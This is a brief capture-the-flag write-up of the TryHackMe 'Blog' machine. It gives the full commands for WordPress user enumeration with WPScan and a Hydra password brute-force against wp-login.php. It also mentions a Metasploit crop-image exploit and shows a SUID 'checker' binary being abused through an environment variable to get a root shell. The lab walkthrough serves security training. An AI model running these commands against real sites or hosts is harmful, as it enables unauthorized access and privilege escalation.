# Blog 
Today I will root a tryhackme machine named Blog
Let's start by running WebMap

We now that there is a Wordpress website and we also now that there is a samba share
- The samba share is just a rabbit hole

Using wpscan we found 2 users
```
wpscan --url $IP --enumerate u
```
- Karen Wheeler - kwheel
- Billy Joel - bjoel

Now that we have their name we can bruteforce the login page using hydra
```
$ hydra -l kwheel -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```
And Now we found the creds of the wordpress user
login: kwheel   password: cutiepie1

Now I used the crop-image exploit on metasploit to access the shell

Am just www-data let's run linpeas.sh

I found an SUID named checker it's checker if we are a sudoer and gives us a a shell
```
$ ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
```

```
$ export admin=1
$ ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash"
```
and now am root
